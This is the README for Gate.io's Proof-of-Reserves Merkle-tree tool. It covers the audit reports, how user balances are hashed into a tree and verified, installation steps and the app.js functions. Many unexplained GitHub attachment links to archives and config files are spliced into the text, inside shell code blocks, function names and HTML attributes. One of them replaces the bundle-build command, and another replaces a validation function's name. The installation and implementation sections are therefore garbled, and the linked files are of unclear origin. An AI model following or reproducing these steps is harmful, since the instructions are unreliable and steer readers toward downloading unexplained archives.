# Gate.io Proof-of-Reserves

This document introduces the background and guidance regarding Gate's audit process of Proof-of-Reserves, in order to transparently prove to customers that Gate held full reserves of their funds.

## Table of Contents</strong>
- [Gate.io Proof-of-Reserves](#gateio-proof-of-reserves)
  - [Table of Contents</strong>](#table-of-contentsstrong)
  - [Released Audit Assessment](#released-audit-assessment)
  - [Background](#background)
  - [Process Overview](#process-overview)
  - [Technical Details](#technical-details)
  - [Installation](#installation)
  - [Usage](#usage)
  - [Implementation Details](#implementation-details)
  - [License](#license)
   

## Released Audit Assessment
| Report Release Date         | Snapshot Time | Audit Company | Currency | Report                                                                                                                                                                 | Website                                                                          | Status   |
| ------------ | ------------- | ------------- | -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- | -------- |
| May 11, 2024 | May 04, 2024, 00:00 UTC | Armanino LLP  | BTC      | [Gate.io Proof-of-Reserves Assessment Report [BTC] [May-25-2024]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC]%20[May-25-2024].pdf) | [Trust Explorer - Proof of Reservers (May-25-2024)](https://proof-of-reserves.trustexplorer.io/clients/gate.io/gate-dataset-628806) | Released |
| Oct 28, 2024| Oct 19, 2024, 00:00 UTC | Armanino LLP  | BTC&ETH  | [Gate.io Proof-of-Reserves Assessment Report [BTC&ETH] [Oct-28-2024]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC&ETH]%20[Oct-28-2024].pdf) | [Trust Explorer - Proof of Reservers (Oct-28-2024)](https://proof-of-reserves.trustexplorer.io/clients/gate.io) | Released |

## Background
One of the core problems with cryptocurrency exchanges is transparency, which primarily involves in the proof of reserves. Because customers need to know and confirm that the service they are using does in fact hold 100% of their funds. Hence, Gate came up with this solution utilizing the Merkle tree`[zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727316/zkmerkle_cex_20240520.tar.gz)
 `approach to give customers the ability to verify their fund is fully held by Gate; besides, an independent and cryptographically-verified audit was employed to help with the audit process.

## Process Overview
* ### Auditor generates the Merkle tree with user balances provided by Gate
   Gate provides the auditor with all the details of user balances on a token basis. The auditor will then import the user balances into generator.html to generate the Merkle tree, as shown below:

   <p align="center"> 
    <img src="images/import.png" alt="" style="width:500px;"/>
   </P>

* ### Auditor verifies the total user balance and publish the merkle tree and root hash
   After the Merkle tree successfully generated in generator.html, its root hash together with user count and total amount of user balances will be calculated and displayed to the auditor for verification.
   
   The leaves of the Merkle tree will be saved in a plain text file, which will be publicly shared to customers on Github to verify individual's account balance.
   
   <p align="center"> 
    <img src="images/generator.png" alt="" style="width:500px;"/>
   </P>
  

* ### User independently verify their account balance
   User needs to `[cex_config.json](https://github.com/user-attachments/files/16727327/cex_config.json)
`first get the published Merkle tree from Github, import into verifier.html, and then input his/her own hashed User `[user_config.json](https://github.com/user-attachments/files/16727334/user_config.json)
`ID and token balance to trigger the verification process. The hashed user id can be retrieved at https://www.gate.io/myaccount/myavailableproof. If the hashed UID and balance provided by user matches the record in the Merkle tree, a successful result will be displayed together with the node location of user information within the Merkle tree. The Merkle tree's root hash will be re-calculated using the imported file so that user can verify the root hash to ensure the correctness and completeness of the Merkle tree.`[proof.csv](https://github.com/user-attachments/files/16727341/proof.csv)
`
   
   <p align="[proof-of-reserves-1.0.0.zip](https://github.com/user-attachments/files/16727354/proof-of-reserves-1.0.0.zip)
">
    <img src="images/verifier.png" alt="[config.json](https://github.com/user-attachments/files/16727345/config.json)
" style="text-align:right;width:500px;"/>
   </[proof-of-reserves-1.0.0.tar.gz](https://github.com/user-attachments/files/16727359/proof-of-reserves-1.0.0.tar.gz)
p>


## Technical Details
* ### What is Merkle Tree?
   In cryptography and computer science, a hash tree or Merkle tree is a tree in which every leaf node is labelled with the cryptographic hash of a data block, and every non-leaf node is labelled with the hash of the labels of its child nodes. Hash trees allow efficient and secure verification of the contents of large data structures.

* ### How to build the Merkle tree with hashed user id and user balance?
   Hashed user id (UID) and user balances are first exported from Gate's database. Each pair of hashed UID and user balance will be hashed respectively, and then concatenated to form the underlying data block.
   For each data block, the same hash function will be applied to generate the leaf nodes of the Merkle tree. The resulting hashed data are subsequently hashed together in pairs to create the parent nodes of the leaf nodes. This process continues until it results in a single hash known as the merkle root. Please refer to the diagram below for illustration. After the merkle tree is successfully built, the leaf nodes will be exported into a plain text file, which will be published together with the merkle root hash by the auditor.

   <p align="center">
    <img src="images/MerkleTree.png" alt="093d2036bc4a6bab3f956db74856ee98e43bd03b137f7129b5854750335e4940" style="width:800px;"/>
   </p>


* ### Verify hashed user id and balance using Merkle proof
   In order to verify the input hashed user id (UID) and user balance, we need to construct a merkle proof to verify the inclusion of such data within the Merkle tree. 

    Merkle proofs are established by hashing the concatenation of hashed UID and hashed user balance, and climbing up the tree until obtaining the root hash, which has been published by the auditor in step #2.

    The merkle proofs are explained with following example.

    In order to verify the inclusion of data (UID, Balance) from user input, in the merkle tree root, we use a one way function to hash the hashed value of UID and Balance to obtain data K, and then we apply the same hash function on data K to obtain H(K), denoted by K'. In order to validate the inclusivity of K, K doesn't have to be revealed, similarly, the hash of data A can be revealed without any implicit security repercussions and so on. 

    Taking the calculations steps below:
    * K' when hashed with the hash of the unknown dataset A, yields A'K', which is H(A' + K')
    * A'K' hashed with C'D' leads to the root, H(A'K' + C'D')
    * Compare the value of H(A'K' + C'D') with the published merkle root hash

   Hence, we can prove whether the uer input data of (hashed UID, Balance) is present or not in our merkle tree, wihtout having to reveal any other customer's user id or balance.

   <p align="center">
    <img src="images/MerkleProof.png" alt="" style="width:800px;"/>
   </p>

## Installation
> Install dependencies
  ```shell
  npm `[zkmerkle_cex_20240113.tar.gz](https://github.com/user-attachments/files/16727385/zkmerkle_cex_20240113.tar.gz)
`install
  ```
> Install build tool
  ```shell
 [zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727391/zkmerkle_cex_20240520.tar.gz)
 npm install -g browserify watchify
  ```
> Create bundle.js to make it runanble in browser
  ```shell
  [cex_config.json](https://github.com/user-attachments/files/16727401/cex_config.json)

  ```
> To achieve auto build of bundle.js, use watchify as shown below, or use nohup to make watchify command running at background
  ```shell
  nohup watchify app.js -o bundle.js -v > nohup.out 2>&1 </dev/null &
  ```

## Usage
* Open **`generator.html`** in browser, import file with UID and user balances to build Merkle tree
* Open **`verifier.html`** in browser, to validate UID and balance combination

## Implementation Details
* **`app.js`** core logic to build Merkle tree and perform validation
    * The js function at the top handles interaction between js code and HTML. It receives user actions via HTML events, such as uploading raw user balance, creating Merkle tree, uploading Merkle tree and verifying user balance, and process the user input, then dispatch it to corresponding functions for further processing.
    * Function ***`bufferToString()`*** handles String conversion to hex format. Since the Merkle tree node values, while retrieved from the buffer, are all in binary format.
    * Function ***`createMerkle([zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727403/zkmerkle_cex_20240520.tar.gz)
)`*** does four things below:
        * Reads the hashed user id and user balance provided in a plain text file, which was exported from Gate's database
        * Then each pair of hashed user id and corresponding balance will be hashed ([bip340_test_vectors.csv](https://github.com/user-attachments/files/16727434/bip340_test_vectors.csv)
) respectively, concatenated and then hashed again to form the leaf nodes of the Merkle tree. In order to reduce the space usage as well as the size of output file, only the first 16 bits of the hashed values will be kept. Then, each pair of the leaf nodes will be hashed and concatenated to form their parent node. This process continues until only one parent node (the root node) left.
        * Calculate the total user balance and root hash of the Merkle tree, and display in generator.html.
        * Save all leave node values of the Merkle tree in a plain text file for future verification by individuals and auditors.
    * Function ***`[zkmerkle_cex_20240305.tar.gz](https://github.com/user-attachments/files/16727449/zkmerkle_cex_20240305.tar.gz)
`*** does two validations as below:
        * Validate if the provided hashed user id and user balance can be found in the leave nodes of the Merkle tree. This validation first computes the hashed value of provided hashed user id and user balance, and look up the hashed value in the leaves nodes that saved from createMerkle() function.
        * Only after step 1 succeed, then verify the hashed value is within the Merkle tree that generated in createMerkle() function. Verification was processed by the library api verify(), provided in merkletreejs.
* **`FileSaver.js`** plugin to save files
* **`[PR01MAY24.xlsx](https://github.com/user-attachments/files/16727508/PR01MAY24.xlsx)
`** html page to build Merkle tree and calculate merkle root hash
* **`verifier.html`** html page to validate hashed user id and user balance
* **`[developer-notes.md](https://github.com/user-attachments/files/16727523/developer-notes.md)
.json`** holds various metadata relevant to the project and handle the project's dependencies

## License
Copyright 2020 © Gate Technology Inc.. All rights reserved.

Licensed under the **[GPLv3](LICENSE)** license.
